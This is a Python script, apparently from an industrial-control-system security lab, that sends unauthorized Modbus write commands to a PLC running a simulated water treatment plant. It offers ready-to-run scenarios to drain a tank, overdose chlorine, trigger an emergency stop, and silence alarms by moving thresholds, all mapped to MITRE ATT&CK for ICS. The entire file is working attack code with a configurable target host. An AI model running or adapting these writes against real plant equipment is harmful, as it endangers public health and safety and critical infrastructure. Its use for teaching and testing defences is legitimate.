"""Unauthorized Modbus write: manipulate plant actuators and setpoints.

Demonstrates what happens when an attacker gains access to the OT network
and sends write commands directly to the PLC, bypassing the HMI.

Attack scenarios:
  1. Open the outlet valve and kill the intake pump (drain the tank)
  2. Max out the chemical dosing pump (chlorine overdose)
  3. Trigger emergency stop (shut down the plant)
  4. Set dangerous alarm thresholds (mask real alarms)

MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message),
T0836 (Modify Parameter), T0816 (Device Restart/Shutdown)

Usage:
    python scripts/hijack.py drain   [--host 127.0.0.1] [--port 5020]
    python scripts/hijack.py overdose
    python scripts/hijack.py estop
    python scripts/hijack.py mask
"""

from __future__ import annotations

import argparse
import socket
import sys
import time

sys.path.insert(0, ".")
from forge.protocol.modbus import (
    parse_frame,
    write_single_coil,
    write_single_register,
)


def send(sock: socket.socket, data: bytes) -> None:
    sock.sendall(data)
    sock.recv(256)


def main() -> None:
    parser = argparse.ArgumentParser(description="Modbus attack: unauthorized writes")
    parser.add_argument("scenario", choices=["drain", "overdose", "estop", "mask"])
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((args.host, args.port))

    uid = 1
    tid = 100

    if args.scenario == "drain":
        print("[*] Attack: draining the tank")
        print("[*] Killing intake pump (coil 0 = OFF)")
        send(sock, write_single_coil(tid, uid, 0, False))
        tid += 1
        print("[*] Opening outlet valve (coil 2 = ON)")
        send(sock, write_single_coil(tid, uid, 2, True))
        tid += 1
        print("[*] Setting intake rate to 0%")
        send(sock, write_single_register(tid, uid, 0, 0))
        print("[+] Tank will drain. Watch the dashboard.")

    elif args.scenario == "overdose":
        print("[*] Attack: chlorine overdose")
        print("[*] Enabling dosing pump (coil 1 = ON)")
        send(sock, write_single_coil(tid, uid, 1, True))
        tid += 1
        print("[*] Setting dose rate to 100%")
        send(sock, write_single_register(tid, uid, 1, 100))
        print("[+] Chlorine will spike. Watch the dashboard.")

    elif args.scenario == "estop":
        print("[*] Attack: triggering emergency stop")
        send(sock, write_single_coil(tid, uid, 3, True))
        print("[+] E-STOP engaged. Plant halted.")

    elif args.scenario == "mask":
        print("[*] Attack: masking alarms by moving thresholds")
        print("[*] Setting tank high alarm to 100% (will never fire)")
        send(sock, write_single_register(tid, uid, 2, 100))
        tid += 1
        print("[*] Setting tank low alarm to 0% (will never fire)")
        send(sock, write_single_register(tid, uid, 3, 0))
        print("[+] Alarms masked. Real conditions will go unnoticed.")

    sock.close()
    print("[*] Done.")


if __name__ == "__main__":
    main()
